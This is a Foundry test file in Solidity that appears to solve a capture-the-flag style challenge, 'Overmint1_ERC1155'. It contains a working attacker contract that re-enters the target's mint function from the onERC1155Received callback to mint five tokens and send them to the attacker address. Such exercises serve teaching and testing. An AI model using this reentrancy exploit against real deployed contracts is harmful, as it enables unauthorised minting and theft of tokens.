// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Overmint1_ERC1155} from "../src/Overmint1-ERC1155.sol";

pragma solidity ^0.8.0;

contract Overmint1_ERC1155Test is Test {
    Overmint1_ERC1155 overmintContract;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        overmintContract = new Overmint1_ERC1155();

        vm.deal(attacker, 3 ether);
    }

    function testOvermint1_ERC1155() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.startPrank(attacker);
        Overmint1_ERC1155_Attacker overmintContractAttacker = new Overmint1_ERC1155_Attacker(overmintContract);
        overmintContractAttacker.attack();
        vm.stopPrank();

        assertEq(overmintContract.balanceOf(attacker, 0), 5);
        assertEq(overmintContract.success(attacker, 0), true);
        assert(vm.getNonce(attacker) < currentNonce + 3);
    }
}

contract Overmint1_ERC1155_Attacker {
    Overmint1_ERC1155 public overmintContract;
    address public owner;

    uint256 enteredAmount;

    constructor(Overmint1_ERC1155 _overmintContract) {
        owner = msg.sender;
        overmintContract = _overmintContract;
    }

    function attack() public {
        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = 0;
        amounts[0] = 5;
        overmintContract.mint(0, "");
        overmintContract.safeBatchTransferFrom(address(this), owner, ids, amounts, "");
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public returns (bytes4) {
        if (enteredAmount < 5) {
            enteredAmount++;
            overmintContract.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }
}
